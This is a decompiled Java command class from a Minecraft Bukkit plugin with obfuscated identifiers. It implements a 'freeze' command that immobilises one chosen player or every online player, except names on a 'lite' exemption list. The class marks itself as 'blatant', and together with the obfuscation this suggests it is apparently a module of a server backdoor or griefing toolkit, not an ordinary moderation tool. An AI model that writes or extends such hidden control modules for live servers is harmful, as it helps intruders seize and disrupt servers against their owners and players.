/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class FreezeCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public FreezeCommand() {
        FreezeCommand lIllIllIlIlII;
    }

    @Override
    public void execute(Core lIllIlIlIIlIl, String lIllIlIlIlIIl, String[] lIllIlIlIlIII, Player lIllIlIlIIIlI) {
        if (lIllIlIlIlIII.length <= 1) {
            lIllIlIlIIIlI.sendMessage(Settings.USAGE("freeze <player>"));
        } else if (lIllIlIlIlIII[1].equals("*")) {
            if (lIllIlIlIIlIl.frozen) {
                lIllIlIlIIIlI.sendMessage(Settings.PREFIX("Everyone is already frozen!"));
            } else {
                lIllIlIlIIlIl.frozen = true;
                for (Player lIllIlIlIllIl : Bukkit.getOnlinePlayers()) {
                    if (lIllIlIlIIlIl.lite.contains(lIllIlIlIllIl.getName()) || lIllIlIlIIlIl.frozenPlayers.contains(lIllIlIlIllIl.getName())) continue;
                    lIllIlIlIIlIl.frozenPlayers.add(lIllIlIlIllIl.getName());
                }
                lIllIlIlIIIlI.sendMessage(Settings.PREFIX("Everyone is now frozen"));
            }
        } else {
            Player lIllIlIlIllII = Bukkit.getServer().getPlayer(lIllIlIlIlIII[1]);
            if (lIllIlIlIllII == null) {
                lIllIlIlIIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lIllIlIlIlIII[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (lIllIlIlIIlIl.frozenPlayers.contains(lIllIlIlIllII.getName())) {
                lIllIlIlIIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lIllIlIlIllII.getName()).append(Settings.WHITE).append(" is already frozen"))));
            } else {
                lIllIlIlIIlIl.frozenPlayers.add(lIllIlIlIllII.getName());
                lIllIlIlIIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lIllIlIlIllII.getName()).append(Settings.WHITE).append(" is now frozen!"))));
            }
        }
    }
}

